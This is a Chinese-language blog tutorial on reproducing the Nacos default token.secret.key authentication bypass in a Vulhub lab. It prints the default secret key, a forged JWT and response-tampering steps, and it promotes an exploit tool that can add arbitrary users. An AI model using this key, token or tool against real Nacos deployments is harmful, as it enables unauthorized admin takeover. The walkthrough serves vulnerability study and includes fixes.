# 原创
：  Nacos身份认证权限绕过+漏洞利用工具分享

# Nacos身份认证权限绕过+漏洞利用工具分享

### 一 JWT

##### JWT:

JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<br/> 在线解密查看内容：

```
https://jwt.io/
```

##### JWT的使用场景：

1.Authorization(授权): 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。

2.Exchange (信息交换):对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWT可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。

##### JWT构造：

JSON Web Token由三部分组成，它们之间用圆点连接。<br/> 这三部分分别是:

```
Header

Payload

Signature
```

Header由两部分组成:<br/> 1.token的类型(JWT)<br/> 2.算法名称(比如: HMACSHA256或者RSA等等)

Payload：<br/> 声明是关于实体(通常是用户)和其他数据的声明。<br/> 声明有三种类型: registered, public 和 private。

Signature：<br/> 为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。

### 二 漏洞描述：

开源服务管理平台Nacos在默认配置下未对token.secret.key进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。

### 三 环境搭建

```
搭建地址：

https://vulhub.org/#/docs/install-docker-one-click/
```

1.虚拟机安装一个kali，按照搭建地址上面的步骤一步一步安装docker容器，再把Vulhub下载到里面

<br/> 2.安装完成后，来到nacos的cve的文件夹下面，运行命令行搭建环境

```
docker-compose up -d
```

<br/> 3.这样就可以搭建一个环境，在访问你的 http://你的环境ip:8848

4.移除环境

```
docker-compose down
```

<br/> 5.同样的Vulhub里面集合了很多漏洞的环境，都应该使用上面的步骤进行搭建环境去复现

### 四 漏洞复现

1.在nacos中，token.secret.key值是固定死的，位置在conf下的application.properties中<br/> 默认的key：<br/>`SecretKey012345678901234567890123456789012345678901234567890123456789`

2.利用该默认 key可进行jwt构造，直接进入后台。<br/> 构造方法: 在https://jwt.io/ 中<br/> payload设置<br/> （1703214491是unix时间戳，设置这个参数的时候要比你系统当前的时间更晚）：​​​​​​​

```
{

"sub": "nacos",

"exp": 1703214491

}
```

把key输入到jwt的Signature当中

3.得到jwt密文，复制加密的jwt

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcwMzIxNDQ5MX0.OnuuwTKWB7_NaZFEYtTMbwbsiJAXGwteeyYh10sLz4w
```

4.复制上面得到的值，抓包修改包，添加Authorization值，发送到nacos，获取到登录成功的带有token的响应包

5.在登陆页面随机输入任意账号密码去登陆，修改响应包为登录成功带有token的响应包

6.成功绕过登录到后台页面

### 五 工具漏洞复现

1.这款NacosExploitGUI_v3.9.jar非常简单好用，一键检测漏洞利用。<br/> 支持了六种nacos漏洞检测：
1.  `Nacos控制台默认口令漏洞(nacos,nacos)` 1.  `Nacos token.secret.key默认配置(QVD-2023-6271)` 1.  `Nacos-client Yaml反序列化漏洞` 1.  `Nacos Derby SQL注入漏洞 (CNVD-2020-67618)` 1.  `Nacos未授权访问漏洞（CVE-2021-29441）` 1.  `Nacos Jraft Hessian反序列化漏洞(QVD-2023-13065)` 
2.可以利用存在的漏洞，任意添加用户

### 六 修复建议
1.  `1.自行修改key` 1.  `2.更新到最新版本` 
### 七 工具分享

> 
-  `Nacos工具` -  `https://www.alipan.com/s/iVNZyoz3uWf` -  `提取码: 59ew` 


> 
-  `工具地址` -  `https://github.com/charonlight/NacosExploitGUI` 


**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/11eb22965baf40a78c6067aa2fd1f27c.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/da83e4ba8af54a649820a4dfb4dd49af.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a57683a370e49bc8a21fe730ba5be06.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/2d54041bba0041c7a455e3f4acf7eeca.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/0d1975018a294ed7b62dac333b583942.png" width="665"/>

应急响应笔记

学习路线
